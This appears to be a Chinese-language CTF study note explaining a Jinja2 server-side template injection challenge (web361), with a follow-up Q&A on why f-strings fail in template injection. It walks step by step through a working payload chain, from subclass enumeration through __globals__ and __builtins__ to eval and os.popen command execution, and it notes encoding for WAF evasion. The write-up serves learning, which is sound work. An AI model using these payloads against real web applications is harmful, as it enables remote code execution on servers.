[[ssti寻找祖先的方法]]
你的重点是**深入解析 WP 中的攻击链本身**，而不是扩展到过多的泛化内容。下面我将围绕你提供的 `web361-ssti` 题目，对每一步 Payload 的**底层原理、执行逻辑以及关键细节**进行系统化讲解，帮助你彻底理解这一利用链。

---

# 🧨 web361 - SSTI 攻击链深度解析

## 🧩 1. 漏洞入口：`name` 参数存在 SSTI

题目中的 URL：

```text
/?name={{ ... }}
```

说明用户输入被直接拼接到模板中，例如：

```python
# 存在漏洞的代码示例
render_template_string(f"Hello {name}")
```

由于 `name` 被直接嵌入模板字符串中，Jinja2 会将 `{{ ... }}` 内的内容作为 **Python 表达式** 在服务器端执行，从而形成 **SSTI（Server-Side Template Injection）**。

---

## 🔍 2. 枚举所有子类

### Payload

```jinja2
{{ ''.__class__.__base__.__subclasses__() }}
```

### 原理解析

| 表达式                 | 含义                              |
| ------------------- | ------------------------------- |
| `''`                | 创建一个字符串实例                       |
| `.__class__`        | 获取该实例的类 `<class 'str'>`         |
| `.__base__`         | 获取 `str` 的父类 `<class 'object'>` |
| `.__subclasses__()` | 返回 `object` 的所有子类               |

### 为什么要这样做？

在 Python 中：

```
object
 ├── str
 ├── list
 ├── dict
 ├── warnings.catch_warnings
 ├── subprocess.Popen
 └── ...
```

`object` 是所有类的根节点，通过 `__subclasses__()` 可以枚举出当前运行环境中的**所有已加载类**。其中某些类的 `__init__` 方法包含 `__globals__`，可以进一步获取 `__builtins__`，从而实现代码执行。

---

[[ssti为什么不直接执行任意代码]]
## 🎯 3. 爆破子类索引

### Payload

```jinja2
{{ ''.__class__.__base__.__subclasses__()[127] }}
```

### 为什么需要爆破索引？

`__subclasses__()` 返回的是一个**列表**，其顺序取决于：

- Python 版本
    
- 已加载模块
    
- 运行环境（Flask、Django 等）
    

因此，在不同环境中，目标类（如 `warnings.catch_warnings`）的索引并不固定，通常需要在 **100~150** 范围内进行尝试。

### 如何判断找到可利用类？

当返回的类具有如下特征时即可利用：

- 存在 `__init__` 方法
    
- `__init__` 是函数对象（而非内建函数）
    
- 可以访问 `__globals__` 属性
    

常见可利用类包括：

|类名|作用|
|---|---|
|`warnings.catch_warnings`|最常见的利用入口|
|`_frozen_importlib._ModuleLock`|可访问模块全局变量|
|`subprocess.Popen`|可直接执行命令|
|`io.TextIOWrapper`|文件读写|

---

## 🧠 4. 通过 `__globals__` 获取 `__builtins__`

### WP 中的 Payload

```jinja2
{{ ''.__class__.__base__.__subclasses__()[127].__init__.__globals__['__builtins__'] }}
```

### 关键概念解析

#### 4.1 `__init__`

- 是类的构造函数。
    
- 在 Python 中，**用户定义的函数**都包含 `__globals__` 属性。
    

#### 4.2 `__globals__`

- 类型：`dict`
    
- 作用：存储函数定义时所在模块的全局变量。
    
- 其中包含 `__builtins__`，即 Python 的内置函数集合。
    

示意结构：

```text
__init__
   └── __globals__
         ├── __name__
         ├── __file__
         ├── os
         └── __builtins__
```

#### 4.3 `__builtins__`

`__builtins__` 可能是：

- 一个 **字典**，或
    
- 一个 **模块对象**
    

其中包含关键函数：

|函数|作用|
|---|---|
|`eval`|执行表达式|
|`exec`|执行语句|
|`open`|读取文件|
|`__import__`|导入模块|
|`input`|读取输入|

---

## 🚀 5. 调用 `eval` 实现任意代码执行

### WP 中的最终 Payload

```jinja2
{{ ''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /flag").read()') }}
```

### 执行流程拆解

|步骤|说明|
|---|---|
|`__builtins__['eval']`|获取 `eval` 函数|
|`__import__("os")`|导入 `os` 模块|
|`.popen("cat /flag")`|执行系统命令|
|`.read()`|读取命令执行结果|

### 等价的 Python 代码

```python
import os
result = os.popen("cat /flag").read()
print(result)
```

---

## 🔗 6. 攻击链整体流程

```text
用户输入
   ↓
Jinja2 模板渲染
   ↓
访问 Python 对象属性
   ↓
object.__subclasses__()
   ↓
定位可利用类
   ↓
__init__.__globals__
   ↓
__builtins__
   ↓
eval / __import__
   ↓
执行系统命令
   ↓
读取 /flag
```

---

## 🧪 7. WP 中 Payload 的 URL 编码版本

WP 中还给出了一个经过 URL 编码的 Payload：

```text
{{%27%27.class.base.subclasses()[104].init.globals[%27__builtins__%27]%27eval%27}}
```

### 编码解析

|编码|原字符|
|---|---|
|`%27`|`'`|

解码后为：

```jinja2
{{''.__class__.__base__.__subclasses__()[104].__init__.__globals__['__builtins__']['eval']}}
```

这种编码方式常用于：

- 绕过 WAF
    
- 避免 URL 解析问题
    
- 防止特殊字符被过滤
    

---

## 🧠 8. 为什么这种方法能够成功？

### 8.1 Python 的反射机制

Python 允许在运行时访问对象的属性和结构，这种能力被称为**反射（Reflection）**。攻击者正是利用这一特性逐步访问敏感对象。

### 8.2 Jinja2 的表达式执行能力

Jinja2 在渲染 `{{ ... }}` 时会直接求值表达式，因此可以访问 Python 对象模型。

### 8.3 `object.__subclasses__()` 的全局可见性

所有已加载的类都会被记录在该列表中，使攻击者能够“遍历”运行环境，寻找可利用入口。

---

## 📌 9. 关键知识点总结

|知识点|说明|
|---|---|
|SSTI|模板引擎执行用户输入|
|`__class__`|获取对象的类|
|`__base__`|获取父类|
|`__subclasses__()`|枚举所有子类|
|`__globals__`|函数的全局命名空间|
|`__builtins__`|Python 内置函数集合|
|`eval`|执行任意代码|
|`__import__`|导入模块|
|`os.popen`|执行系统命令|

---

## 🧭 10. 常见可利用类索引（经验值）

|Python 版本|常见索引|类|
|---|---|---|
|Python 3.6|~59|`warnings.catch_warnings`|
|Python 3.8|~104|`warnings.catch_warnings`|
|Python 3.10+|100~150|依环境而定|

> ⚠️ 这些索引仅供参考，实际利用时仍需枚举确认。

---

## ✅ 11. 总结

**web361 的核心利用思路：**

1. **确认 SSTI：**
    
    ```jinja2
    {{7*7}}
    ```
    
2. **枚举所有子类：**
    
    ```jinja2
    {{ ''.__class__.__base__.__subclasses__() }}
    ```
    
3. **爆破可利用类索引：**
    
    ```jinja2
    {{ ''.__class__.__base__.__subclasses__()[index] }}
    ```
    
4. **获取 `__builtins__`：**
    
    ```jinja2
    {{ ''.__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__'] }}
    ```
    
5. **执行任意代码读取 flag：**
    
    ```jinja2
    {{ ''.__class__.__base__.__subclasses__()[index].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("cat /flag").read()') }}
    ```
    

---

如果你还想进一步探讨 **过滤绕过技巧**、**沙箱逃逸** 或 **不同模板引擎的利用差异**，也可以继续深入交流。

---
## 为什么要 #用字符串连接形式进行模板注入 ？

这是个很好的 Jinja2 SSTI（服务端模板注入）问题，原因在于 **f-string 的解析时机**。

## 根本原因

### 写法一：`{{f"{__class__}"}}` ❌

这里的 `f"..."` 是 **Python f-string**，它在 Python 解释器层面被求值，而不是在 Jinja2 模板层面。

执行流程：

```
Jinja2 收到模板表达式
    → 尝试对 f"{__class__}" 求值
    → Python 需要先执行 f-string
    → f-string 中的 __class__ 在当前作用域找不到（没有绑定的对象）
    → NameError / UndefinedError
    → 渲染失败
```

本质问题：**`f"{__class__}"` 里的 `__class__` 是裸名称，没有任何对象去调用它**，f-string 不知道这是哪个对象的属性。

---

### 写法二：`{{"" .__class__}}` ✅

这是纯 Jinja2 表达式，`""` 是一个具体的字符串对象，`.___class__` 是对它的属性访问。

执行流程：

```
Jinja2 收到模板表达式
    → "" 是一个 str 实例
    → 访问其 __class__ 属性
    → 返回 <class 'str'>
    → 正常渲染
```

---

## 类比理解

在普通 Python 里：

```python
# 这样没意义 —— __class__ 是谁的？
f"{__class__}"   # NameError: name '__class__' is not defined

# 这样才对 —— 明确是 "" 这个对象的 __class__
"".__class__     # <class 'str'>
```

Jinja2 模板里同理，**属性必须有一个明确的宿主对象**。

---

## 总结

| 写法                   | 问题所在                                                    |
| -------------------- | ------------------------------------------------------- |
| `{{f"{__class__}"}}` | f-string 在 Jinja2 求值前就被 Python 处理，`__class__` 没有宿主对象，报错 |
| `{{"" .__class__}}`  | 纯 Jinja2 表达式，`""` 是明确的 str 对象，属性访问合法                    |

CTF 中做 SSTI 时，直接用 Jinja2 原生语法操作对象即可，不需要也不应该嵌套 Python f-string。